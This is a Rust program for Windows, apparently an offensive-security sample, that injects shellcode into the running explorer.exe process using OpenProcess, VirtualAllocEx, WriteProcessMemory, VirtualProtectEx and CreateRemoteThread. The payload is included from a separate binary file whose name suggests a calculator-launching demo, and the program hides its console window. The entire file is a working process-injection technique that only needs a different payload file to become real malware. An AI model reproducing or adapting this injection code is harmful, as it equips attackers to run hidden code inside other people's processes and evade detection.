#![windows_subsystem = "windows"]

use std::mem::transmute;
use std::ptr::{null, null_mut};
use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use windows_sys::Win32::Foundation::{CloseHandle, FALSE};
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows_sys::Win32::System::Memory::{
    VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS};

const SHELLCODE: &[u8] = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
const SIZE: usize = SHELLCODE.len();

#[cfg(target_os = "windows")]
fn main() {
    let mut old = PAGE_READWRITE;

    let mut system = System::new();
    system.refresh_processes();

    let pid = system
        .processes_by_name("explorer")
        .next()
        .expect("no process!")
        .pid()
        .as_u32();

    unsafe {
        let handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

        if handle == 0 {
            panic!("OpenProcess failed!");
        }

        let dest = VirtualAllocEx(
            handle,
            null(),
            SIZE,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if dest.is_null() {
            panic!("VirtualAllocEx failed!");
        }

        let res = WriteProcessMemory(handle, dest, SHELLCODE.as_ptr().cast(), SIZE, null_mut());

        if res == FALSE {
            panic!("WriteProcessMemory failed!");
        }

        let res = VirtualProtectEx(handle, dest, SIZE, PAGE_EXECUTE, &mut old);

        if res == FALSE {
            panic!("VirtualProtectEx failed!");
        }

        let dest = transmute(dest);
        let thread = CreateRemoteThread(handle, null(), 0, dest, null(), 0, null_mut());

        if thread == 0 {
            panic!("CreateRemoteThread failed!");
        }

        CloseHandle(handle);
    }
}
